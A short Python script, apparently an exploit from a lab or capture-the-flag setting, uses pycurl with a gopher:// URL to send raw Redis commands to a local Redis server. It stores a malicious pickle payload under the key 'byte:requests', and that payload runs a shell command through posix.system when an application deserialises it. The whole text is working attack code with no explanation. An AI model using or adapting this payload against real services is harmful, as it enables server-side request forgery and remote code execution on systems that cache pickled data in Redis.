import pycurl
from io import BytesIO

buffer = BytesIO()
c = pycurl.Curl()
c.setopt(c.URL, 'gopher://127.0.0.1:6379/_%2A3%0D%0A%243%0D%0Aset%0D%0A%2413%0D%0Abyte%3Arequests%0D%0A%2446%0D%0A%80%02cposix%0Asystem%0Aq%00X%0E%00%00%00curl%20127.0.0.1q%01%85q%02Rq%03.%0D%0A%2A1%0D%0A%244%0D%0Aquit%0D%0A')
c.setopt(c.WRITEDATA, buffer)
c.perform()
c.close()

body = buffer.getvalue()
print(body.decode('iso-8859-1'))
